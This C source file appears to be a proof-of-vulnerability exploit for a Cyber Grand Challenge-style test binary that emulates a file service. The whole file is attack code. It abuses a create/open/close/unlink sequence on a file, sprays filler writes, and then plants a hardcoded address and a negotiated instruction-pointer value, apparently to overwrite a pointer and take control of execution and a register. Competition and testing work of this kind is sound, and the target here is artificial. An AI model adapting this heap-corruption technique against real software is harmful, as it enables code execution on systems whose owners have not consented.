#include <libpov.h>
enum {
  OPEN_F_NUM = 1,
  READ_F_NUM,
  WRITE_F_NUM,
  LSEEK_F_NUM,
  CLOSE_F_NUM,
  CREAT_F_NUM,
  UNLINK_F_NUM,
};

enum
{
  RDONLY = 1 << 0,
  RDWR   = 1 << 1,
  TRUNC  = 1 << 2,
  APPEND = 1 << 3,
};

#define dumb(__x) ((unsigned char *)(__x))

uint8_t* buffer = NULL;
uint32_t buffer_cap = 2 << 20;
uint32_t buffer_len = 0;

void buffer_append(uint8_t* data, uint32_t data_len)
{
  if (buffer_len + data_len > buffer_cap)
  {
    uint8_t* new = malloc(buffer_cap * 2);
    memcpy(new, buffer, buffer_len);
    free(buffer);

    buffer_cap *= 2;
    buffer = new;
  }

  memcpy(buffer + buffer_len, data, data_len);
  buffer_len += data_len;
}

uint64_t delim = 0x8442e492f255bf31;
int send_req(int fnum, uint8_t* bytes, size_t len)
{

#if 1
  buffer_append((uint8_t*)&fnum, sizeof(fnum));
  buffer_append((uint8_t*)&len, sizeof(len));
  buffer_append(bytes, len);
#else
  transmit_all(STDOUT, dumb(&fnum), sizeof(fnum));
  transmit_all(STDOUT, dumb(&len), sizeof(len));
  transmit_all(STDOUT, dumb(bytes), len);
#endif

  return 0;
}

int uc(int c, const char* path)
{
  size_t s = 0;
  int mode = 0;

  size_t slen = strlen(path) + 1;
  s += sizeof(slen) + slen;
  s += sizeof(mode);

  uint8_t* out = malloc(s);
  memcpy(out, &slen, sizeof(slen));
  memcpy(out + sizeof(slen), path, slen);
  memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));

  if (c)
    return send_req(CREAT_F_NUM, out, s);
  else
    return send_req(UNLINK_F_NUM, out, s);
}

int creat(const char* path)
{
  return uc(1, path);
}

int unlink(const char* path)
{
  return uc(0, path);
}

int open(const char* path, int flags, int mode)
{
  size_t s = 0;

  size_t slen = strlen(path) + 1;
  s += sizeof(slen);
  s += slen;
  s += sizeof(flags);
  s += sizeof(mode);

  uint8_t* out = malloc(s);

  memcpy(out, &slen, sizeof(slen));
  memcpy(out + sizeof(slen), path, slen);
  memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
  memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));

  return send_req(OPEN_F_NUM, out, s);
}

int rw(int r, int fd, size_t count, uint8_t* data)
{
  static uint8_t out[1024];
  size_t s = 0;

  s += sizeof(fd);
  s += sizeof(count);

  if (data)
  {
    s += count;
  }

  memcpy(out, dumb(&fd), sizeof(fd));
  memcpy(out + sizeof(fd), dumb(&count), sizeof(count));

  if (data)
  {
    memcpy(out + sizeof(fd) + sizeof(count), data, count);
  }

  if (r)
    return send_req(READ_F_NUM, out, s);
  else
    return send_req(WRITE_F_NUM, out, s);
}

int read(int fd, size_t count)
{
  return rw(1, fd, count, NULL);
}

int write(int fd, size_t count, uint8_t* data)
{
  return rw(0, fd, count, dumb(data));
}

int close(int fd)
{
  size_t s = 0;

  s += sizeof(fd);
  uint8_t* out = malloc(s);

  memcpy(out, dumb(&fd), sizeof(fd));

  return send_req(CLOSE_F_NUM, out, s);
}

int lseek(int fd, ssize_t offset, int whence)
{
  size_t s = 0;

  s += sizeof(fd);
  s += sizeof(offset);
  s += sizeof(whence);

  uint8_t* out = malloc(s);
  memcpy(out, dumb(&fd), sizeof(fd));
  memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
  memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));

  return send_req(LSEEK_F_NUM, out, s);
}


int main(void)
{
    buffer = malloc(buffer_cap);
    type1_vals t1;
    type1_negotiate(0xfefefefe, 0xfefefefe, 7, &t1);

    if (!t1.ipval) t1.ipval = 0xcccccccc;
    if (!t1.regval) t1.regval = 0xdddddddd;

    creat("/poop");
    open("/poop", APPEND | RDWR, 0);
    open("/poop", APPEND | RDWR, 0);
    close(0);
    unlink("/poop");

    void* payload_addr_addr = "\x1c\x37\xe4\xb7";

    uint8_t all_filler_no_killer[4];
    memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
    for (size_t i = 0; i < 32768; ++i)
    {
      write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
    }
    write(1, sizeof(uint32_t), dumb(payload_addr_addr));
    write(1, sizeof(uint32_t), dumb(&t1.ipval));

    lseek(1, t1.regval, 0);
    unsigned done = 0xb7eb7e;
    transmit_all(STDOUT, buffer, buffer_len);
    transmit_all(STDOUT, &done, sizeof(done));

    for (size_t i = 0; i < 32771; ++i)
    {
      delimited_read(STDIN, NULL, NULL, dumb(&delim), sizeof(delim));
    }

    return 0;
}
